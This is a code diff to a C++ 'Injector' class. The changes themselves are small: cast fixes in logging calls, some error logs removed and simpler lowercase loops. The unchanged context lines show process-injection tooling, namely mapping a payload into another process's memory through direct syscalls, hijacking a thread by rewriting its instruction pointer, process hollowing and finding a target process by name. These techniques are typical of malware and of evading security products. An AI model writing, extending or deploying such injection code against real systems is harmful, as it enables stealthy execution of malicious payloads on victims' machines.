@@ -32,10 +32,10 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
     // 1. Alloc RW via syscall
     NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!NT_SUCCESS(status)) {
-        LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex(status));
+        LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
         return false;
     }
-    LOG_INFO("MapAndInject: Allocated at " + utils::Shared::ToHex((DWORD64)pTargetBase));
+    LOG_INFO("MapAndInject: Allocated at " + utils::Shared::ToHex((unsigned long long)pTargetBase));
 
     // 2. Map & Reloc locally
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
@@ -94,24 +94,20 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
 
 bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
     CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_CONTROL; // Only need control registers (RIP/EIP)
+    ctx.ContextFlags = CONTEXT_CONTROL;
 
-    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) {
-        LOG_ERR("HijackThread: NtSuspendThread fail.");
-        return false;
-    }
+    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;
 
     if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
-        LOG_ERR("HijackThread: NtGetContextThread fail.");
         SysNtResumeThread(hThread, NULL);
         return false;
     }
 
 #ifdef _M_AMD64
-    LOG_INFO("HijackThread: RIP: " + utils::Shared::ToHex(ctx.Rip) + " -> " + utils::Shared::ToHex((DWORD64)pEntryPoint));
+    LOG_INFO("HijackThread: RIP: " + utils::Shared::ToHex((unsigned long long)ctx.Rip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
     ctx.Rip = (DWORD64)pEntryPoint;
 #else
-    LOG_INFO("HijackThread: EIP: " + utils::Shared::ToHex(ctx.Eip) + " -> " + utils::Shared::ToHex((DWORD)pEntryPoint));
+    LOG_INFO("HijackThread: EIP: " + utils::Shared::ToHex((unsigned long long)ctx.Eip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
     ctx.Eip = (DWORD)pEntryPoint;
 #endif
 
@@ -141,7 +137,7 @@ bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<u
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
     PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    LOG_INFO("HollowProcess: EntryPoint at " + utils::Shared::ToHex((DWORD64)pEntryPoint));
+    LOG_INFO("HollowProcess: EntryPoint at " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
 
     if (HijackThread(pi.hThread, pEntryPoint)) {
          LOG_INFO("HollowProcess: Success.");
@@ -162,9 +158,9 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
         if (Process32FirstW(hSnapshot, &pe)) {
             do {
                 std::wstring currentProcess = pe.szExeFile;
-                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
+                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                 std::wstring targetProcess = processName;
-                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)::towlower(c); });
+                for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
                 if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
             } while (Process32NextW(hSnapshot, &pe));
         }
